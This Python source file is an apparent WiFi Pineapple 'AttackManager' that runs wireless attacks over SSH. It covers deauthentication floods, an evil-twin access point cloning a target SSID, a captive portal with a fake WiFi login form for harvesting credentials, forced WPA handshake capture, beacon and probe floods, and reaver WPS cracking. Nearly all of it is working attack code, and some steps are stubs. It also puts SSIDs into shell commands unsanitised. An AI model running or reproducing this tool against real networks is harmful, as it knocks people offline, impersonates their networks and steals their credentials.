"""
Attack Manager for Penetration Testing Operations
Handles deauth attacks, evil twin, captive portal, and other attack vectors
"""

import subprocess
import threading
import time
import json
import os
from typing import Dict, List, Optional, Callable, Any
from dataclasses import dataclass, asdict
from enum import Enum
import tempfile

class AttackType(Enum):
    DEAUTH = "deauth"
    EVIL_TWIN = "evil_twin"
    CAPTIVE_PORTAL = "captive_portal"
    HANDSHAKE_CAPTURE = "handshake_capture"
    BEACON_FLOOD = "beacon_flood"
    PROBE_REQUEST_FLOOD = "probe_request_flood"
    WPS_ATTACK = "wps_attack"

class AttackStatus(Enum):
    IDLE = "idle"
    PREPARING = "preparing"
    RUNNING = "running"
    COMPLETED = "completed"
    STOPPED = "stopped"
    ERROR = "error"

@dataclass
class AttackTarget:
    bssid: str
    ssid: str
    channel: int
    encryption: str
    signal_strength: int
    clients: List[str] = None

@dataclass
class AttackJob:
    attack_id: str
    attack_type: AttackType
    target: AttackTarget
    options: Dict[str, Any]
    status: AttackStatus
    start_time: float
    end_time: Optional[float]
    results: Dict[str, Any]
    error_message: Optional[str]
    packets_sent: int = 0
    clients_deauthed: int = 0

class AttackManager:
    """Manages penetration testing attack operations"""
    
    def __init__(self, pineapple_ssh=None, logger=None):
        self.pineapple_ssh = pineapple_ssh
        self.logger = logger
        self.active_attacks: Dict[str, AttackJob] = {}
        self.attack_history: List[AttackJob] = []
        self.callbacks: List[Callable] = []
        self._attack_counter = 0
        self._temp_dir = tempfile.mkdtemp()
        
    def add_callback(self, callback: Callable):
        """Add callback for attack updates"""
        self.callbacks.append(callback)
        
    def _notify_callbacks(self, attack_job: AttackJob):
        """Notify all callbacks of attack updates"""
        for callback in self.callbacks:
            try:
                callback(attack_job)
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Error in attack callback: {e}")
    
    def start_attack(self, attack_type: AttackType, target: AttackTarget, options: Dict[str, Any] = None) -> str:
        """Start a new attack"""
        self._attack_counter += 1
        attack_id = f"attack_{self._attack_counter}_{int(time.time())}"
        
        attack_job = AttackJob(
            attack_id=attack_id,
            attack_type=attack_type,
            target=target,
            options=options or {},
            status=AttackStatus.PREPARING,
            start_time=time.time(),
            end_time=None,
            results={},
            error_message=None
        )
        
        self.active_attacks[attack_id] = attack_job
        
        # Start attack in background thread
        thread = threading.Thread(target=self._execute_attack, args=(attack_job,), daemon=True)
        thread.start()
        
        if self.logger:
            self.logger.info(f"Started {attack_type.value} attack on {target.ssid} (ID: {attack_id})")
        
        return attack_id
    
    def _execute_attack(self, attack_job: AttackJob):
        """Execute the actual attack"""
        try:
            attack_job.status = AttackStatus.RUNNING
            self._notify_callbacks(attack_job)
            
            if attack_job.attack_type == AttackType.DEAUTH:
                self._deauth_attack(attack_job)
            elif attack_job.attack_type == AttackType.EVIL_TWIN:
                self._evil_twin_attack(attack_job)
            elif attack_job.attack_type == AttackType.CAPTIVE_PORTAL:
                self._captive_portal_attack(attack_job)
            elif attack_job.attack_type == AttackType.HANDSHAKE_CAPTURE:
                self._handshake_capture(attack_job)
            elif attack_job.attack_type == AttackType.BEACON_FLOOD:
                self._beacon_flood_attack(attack_job)
            elif attack_job.attack_type == AttackType.PROBE_REQUEST_FLOOD:
                self._probe_request_flood(attack_job)
            elif attack_job.attack_type == AttackType.WPS_ATTACK:
                self._wps_attack(attack_job)
            
            if attack_job.status == AttackStatus.RUNNING:
                attack_job.status = AttackStatus.COMPLETED
            
        except Exception as e:
            attack_job.status = AttackStatus.ERROR
            attack_job.error_message = str(e)
            
            if self.logger:
                self.logger.error(f"Attack {attack_job.attack_id} failed: {e}")
        
        finally:
            attack_job.end_time = time.time()
            
            # Move to history and remove from active
            self.attack_history.append(attack_job)
            if attack_job.attack_id in self.active_attacks:
                del self.active_attacks[attack_job.attack_id]
            
            self._notify_callbacks(attack_job)
    
    def _deauth_attack(self, attack_job: AttackJob):
        """Execute deauthentication attack"""
        target = attack_job.target
        duration = attack_job.options.get("duration", 60)  # seconds
        packet_count = attack_job.options.get("packet_count", 0)  # 0 = unlimited
        
        if not self.pineapple_ssh:
            raise Exception("Pineapple SSH connection required for deauth attack")
        
        # Prepare deauth command
        cmd_parts = [
            "timeout", str(duration),
            "aireplay-ng",
            "--deauth", str(packet_count) if packet_count > 0 else "0",
            "-a", target.bssid
        ]
        
        # Add client targeting if specified
        if target.clients:
            for client in target.clients:
                cmd_parts.extend(["-c", client])
        
        # Add interface (assuming wlan1mon for monitor mode)
        cmd_parts.append("wlan1mon")
        
        cmd = " ".join(cmd_parts)
        
        if self.logger:
            self.logger.debug(f"Running deauth attack: {cmd}")
        
        # Execute on Pineapple
        start_time = time.time()
        result = self.pineapple_ssh.run_command(cmd)
        
        # Parse results
        if result:
            lines = result.split('\n')
            packets_sent = 0
            for line in lines:
                if "packets sent" in line.lower():
                    try:
                        packets_sent = int(line.split()[0])
                        break
                    except:
                        pass
            
            attack_job.packets_sent = packets_sent
            attack_job.results = {
                "packets_sent": packets_sent,
                "duration": time.time() - start_time,
                "target_bssid": target.bssid,
                "target_ssid": target.ssid
            }
    
    def _evil_twin_attack(self, attack_job: AttackJob):
        """Execute evil twin attack"""
        target = attack_job.target
        
        if not self.pineapple_ssh:
            raise Exception("Pineapple SSH connection required for evil twin attack")
        
        # Create hostapd configuration
        hostapd_conf = f"""
interface=wlan1
driver=nl80211
ssid={target.ssid}
hw_mode=g
channel={target.channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
        
        # Upload configuration to Pineapple
        conf_path = "/tmp/evil_twin.conf"
        self.pineapple_ssh.run_command(f"cat > {conf_path} << 'EOF'\n{hostapd_conf}\nEOF")
        
        # Start evil twin AP
        cmd = f"hostapd {conf_path}"
        
        if self.logger:
            self.logger.debug(f"Starting evil twin AP: {cmd}")
        
        # This would run in background on the Pineapple
        result = self.pineapple_ssh.run_command(f"nohup {cmd} > /tmp/evil_twin.log 2>&1 &")
        
        # Monitor for connections
        duration = attack_job.options.get("duration", 300)  # 5 minutes
        start_time = time.time()
        connected_clients = []
        
        while time.time() - start_time < duration and attack_job.status == AttackStatus.RUNNING:
            # Check for connected clients
            client_result = self.pineapple_ssh.run_command("iw dev wlan1 station dump")
            if client_result:
                # Parse connected clients (simplified)
                lines = client_result.split('\n')
                for line in lines:
                    if "Station" in line:
                        mac = line.split()[1]
                        if mac not in connected_clients:
                            connected_clients.append(mac)
            
            time.sleep(5)
        
        # Stop evil twin
        self.pineapple_ssh.run_command("pkill hostapd")
        
        attack_job.results = {
            "connected_clients": connected_clients,
            "client_count": len(connected_clients),
            "duration": time.time() - start_time,
            "evil_twin_ssid": target.ssid
        }
    
    def _captive_portal_attack(self, attack_job: AttackJob):
        """Execute captive portal attack"""
        target = attack_job.target
        portal_template = attack_job.options.get("template", "default")
        
        if not self.pineapple_ssh:
            raise Exception("Pineapple SSH connection required for captive portal attack")
        
        # This would set up a captive portal using the Pineapple's web interface
        # For now, we'll simulate the setup
        
        if self.logger:
            self.logger.debug(f"Setting up captive portal for {target.ssid}")
        
        # Setup evil twin first
        self._evil_twin_attack(attack_job)
        
        # Setup captive portal web server
        portal_html = self._generate_captive_portal_html(target.ssid, portal_template)
        
        # Upload portal to Pineapple
        self.pineapple_ssh.run_command(f"mkdir -p /tmp/captive_portal")
        self.pineapple_ssh.run_command(f"cat > /tmp/captive_portal/index.html << 'EOF'\n{portal_html}\nEOF")
        
        # Start web server
        self.pineapple_ssh.run_command("cd /tmp/captive_portal && python3 -m http.server 80 &")
        
        # Setup iptables rules for captive portal
        self.pineapple_ssh.run_command("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80")
        self.pineapple_ssh.run_command("iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80")
        
        # Monitor for credentials
        duration = attack_job.options.get("duration", 600)  # 10 minutes
        start_time = time.time()
        captured_credentials = []
        
        while time.time() - start_time < duration and attack_job.status == AttackStatus.RUNNING:
            # Check for captured credentials (would parse web server logs)
            time.sleep(10)
        
        # Cleanup
        self.pineapple_ssh.run_command("pkill python3")
        self.pineapple_ssh.run_command("iptables -t nat -F")
        
        attack_job.results = {
            "captured_credentials": captured_credentials,
            "credential_count": len(captured_credentials),
            "duration": time.time() - start_time,
            "portal_template": portal_template
        }
    
    def _handshake_capture(self, attack_job: AttackJob):
        """Capture WPA handshake"""
        target = attack_job.target
        timeout = attack_job.options.get("timeout", 300)  # 5 minutes
        
        if not self.pineapple_ssh:
            raise Exception("Pineapple SSH connection required for handshake capture")
        
        # Start airodump-ng to capture handshake
        capture_file = f"/tmp/handshake_{target.bssid.replace(':', '')}"
        cmd = f"timeout {timeout} airodump-ng --bssid {target.bssid} -c {target.channel} -w {capture_file} wlan1mon"
        
        if self.logger:
            self.logger.debug(f"Starting handshake capture: {cmd}")
        
        # Start capture in background
        self.pineapple_ssh.run_command(f"nohup {cmd} > /tmp/airodump.log 2>&1 &")
        
        # Wait a bit then start deauth to force handshake
        time.sleep(5)
        
        # Perform deauth to trigger handshake
        deauth_cmd = f"aireplay-ng --deauth 5 -a {target.bssid} wlan1mon"
        self.pineapple_ssh.run_command(deauth_cmd)
        
        # Wait for capture to complete
        time.sleep(timeout)
        
        # Check if handshake was captured
        result = self.pineapple_ssh.run_command(f"aircrack-ng -c {capture_file}-01.cap")
        handshake_captured = "handshake" in result.lower() if result else False
        
        attack_job.results = {
            "handshake_captured": handshake_captured,
            "capture_file": f"{capture_file}-01.cap",
            "target_bssid": target.bssid,
            "target_ssid": target.ssid
        }
    
    def _beacon_flood_attack(self, attack_job: AttackJob):
        """Execute beacon flood attack"""
        ssid_count = attack_job.options.get("ssid_count", 100)
        duration = attack_job.options.get("duration", 60)
        
        if not self.pineapple_ssh:
            raise Exception("Pineapple SSH connection required for beacon flood")
        
        # Generate random SSIDs
        ssids = [f"FakeAP_{i:03d}" for i in range(ssid_count)]
        
        # Create mdk3 command for beacon flood
        ssid_list_file = "/tmp/ssid_list.txt"
        ssid_list = "\n".join(ssids)
        self.pineapple_ssh.run_command(f"cat > {ssid_list_file} << 'EOF'\n{ssid_list}\nEOF")
        
        cmd = f"timeout {duration} mdk3 wlan1mon b -f {ssid_list_file}"
        
        if self.logger:
            self.logger.debug(f"Starting beacon flood: {cmd}")
        
        result = self.pineapple_ssh.run_command(cmd)
        
        attack_job.results = {
            "ssids_broadcasted": ssid_count,
            "duration": duration,
            "fake_aps_created": ssid_count
        }
    
    def _probe_request_flood(self, attack_job: AttackJob):
        """Execute probe request flood attack"""
        duration = attack_job.options.get("duration", 60)
        
        if not self.pineapple_ssh:
            raise Exception("Pineapple SSH connection required for probe flood")
        
        cmd = f"timeout {duration} mdk3 wlan1mon p"
        
        if self.logger:
            self.logger.debug(f"Starting probe request flood: {cmd}")
        
        result = self.pineapple_ssh.run_command(cmd)
        
        attack_job.results = {
            "duration": duration,
            "attack_type": "probe_request_flood"
        }
    
    def _wps_attack(self, attack_job: AttackJob):
        """Execute WPS attack using reaver"""
        target = attack_job.target
        timeout = attack_job.options.get("timeout", 3600)  # 1 hour
        
        if not self.pineapple_ssh:
            raise Exception("Pineapple SSH connection required for WPS attack")
        
        cmd = f"timeout {timeout} reaver -i wlan1mon -b {target.bssid} -c {target.channel} -vv"
        
        if self.logger:
            self.logger.debug(f"Starting WPS attack: {cmd}")
        
        result = self.pineapple_ssh.run_command(cmd)
        
        # Parse results for WPS PIN and PSK
        wps_pin = None
        wpa_psk = None
        
        if result:
            lines = result.split('\n')
            for line in lines:
                if "WPS PIN:" in line:
                    wps_pin = line.split("WPS PIN:")[1].strip()
                elif "WPA PSK:" in line:
                    wpa_psk = line.split("WPA PSK:")[1].strip()
        
        attack_job.results = {
            "wps_pin": wps_pin,
            "wpa_psk": wpa_psk,
            "success": wps_pin is not None,
            "target_bssid": target.bssid
        }
    
    def _generate_captive_portal_html(self, ssid: str, template: str) -> str:
        """Generate captive portal HTML"""
        if template == "wifi_login":
            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login - {ssid}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }}
        .container {{ max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        h1 {{ text-align: center; color: #333; }}
        input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }}
        button:hover {{ background: #0056b3; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Connect to {ssid}</h1>
        <p>Please enter your WiFi credentials to continue:</p>
        <form method="post" action="/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
"""
        else:
            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Access - {ssid}</title>
</head>
<body>
    <h1>Welcome to {ssid}</h1>
    <p>Click to continue to the internet.</p>
    <button onclick="window.location.href='http://google.com'">Continue</button>
</body>
</html>
"""
    
    def stop_attack(self, attack_id: str) -> bool:
        """Stop an active attack"""
        if attack_id in self.active_attacks:
            attack_job = self.active_attacks[attack_id]
            attack_job.status = AttackStatus.STOPPED
            attack_job.end_time = time.time()
            
            # Try to stop any running processes on Pineapple
            if self.pineapple_ssh:
                self.pineapple_ssh.run_command("pkill -f aireplay-ng")
                self.pineapple_ssh.run_command("pkill -f airodump-ng")
                self.pineapple_ssh.run_command("pkill -f hostapd")
                self.pineapple_ssh.run_command("pkill -f mdk3")
                self.pineapple_ssh.run_command("pkill -f reaver")
            
            # Move to history
            self.attack_history.append(attack_job)
            del self.active_attacks[attack_id]
            
            self._notify_callbacks(attack_job)
            
            if self.logger:
                self.logger.info(f"Stopped attack {attack_id}")
            
            return True
        
        return False
    
    def get_attack_status(self, attack_id: str) -> Optional[AttackJob]:
        """Get status of a specific attack"""
        if attack_id in self.active_attacks:
            return self.active_attacks[attack_id]
        
        # Check history
        for attack in self.attack_history:
            if attack.attack_id == attack_id:
                return attack
        
        return None
    
    def get_active_attacks(self) -> List[AttackJob]:
        """Get all active attacks"""
        return list(self.active_attacks.values())
    
    def get_attack_history(self) -> List[AttackJob]:
        """Get attack history"""
        return self.attack_history.copy()
    
    def export_results(self, attack_id: str, format: str = "json") -> Optional[str]:
        """Export attack results"""
        attack_job = self.get_attack_status(attack_id)
        if not attack_job:
            return None
        
        if format == "json":
            return json.dumps(asdict(attack_job), indent=2, default=str)
        
        return None